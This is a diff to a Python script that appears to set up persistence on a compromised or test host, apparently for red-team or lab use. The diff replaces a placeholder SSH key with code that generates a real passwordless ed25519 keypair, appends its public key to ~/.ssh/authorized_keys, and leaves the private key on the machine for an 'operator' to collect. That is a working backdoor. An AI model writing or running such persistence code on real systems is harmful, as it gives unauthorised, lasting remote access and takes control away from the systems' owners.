@@ -74,20 +74,37 @@ except Exception as e:
     results["errors"].append("systemd: " + type(e).__name__ + ": " + str(e))
 
 # --- 3. SSH authorized_keys persistence (best-effort) ---
+# Generate a REAL ed25519 keypair (ssh-keygen) and plant the pubkey into
+# authorized_keys. Previously this appended a placeholder string that could
+# never authenticate -- the marker lied about persistence. The private key
+# stays at ~/.ssh/persist_ed25519 on this box for the operator to retrieve.
 try:
     ssh_dir = os.path.expanduser("~/.ssh")
     os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
+    key_path = os.path.join(ssh_dir, "persist_ed25519")
     ak_path = os.path.join(ssh_dir, "authorized_keys")
-    placeholder_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPERSIST_PLACEHOLDER_KEY persist@host"
-    existing = ""
-    if os.path.exists(ak_path):
-        with open(ak_path) as fh:
-            existing = fh.read()
-    if "persist@host" not in existing:
-        with open(ak_path, "a") as fh:
-            fh.write(placeholder_key + "\\n")
-    os.chmod(ak_path, 0o600)
-    results["authorized_keys"] = True
+    # Generate a fresh key only if one isn't already planted (idempotent).
+    if not (os.path.exists(key_path) and os.path.exists(key_path + ".pub")):
+        subprocess.run(
+            ["ssh-keygen", "-t", "ed25519", "-f", key_path, "-N", "", "-C", "persist@host"],
+            capture_output=True, text=True, timeout=30,
+        )
+    pub_key = ""
+    if os.path.exists(key_path + ".pub"):
+        with open(key_path + ".pub") as fh:
+            pub_key = fh.read().strip()
+    if pub_key:
+        existing = ""
+        if os.path.exists(ak_path):
+            with open(ak_path) as fh:
+                existing = fh.read()
+        if pub_key not in existing:
+            with open(ak_path, "a") as fh:
+                fh.write(pub_key + "\\n")
+        os.chmod(ak_path, 0o600)
+        results["authorized_keys"] = True
+    else:
+        results["errors"].append("authorized_keys: ssh-keygen produced no pubkey (ssh-keygen missing?)")
 except Exception as e:
     results["errors"].append("authorized_keys: " + type(e).__name__ + ": " + str(e))
 
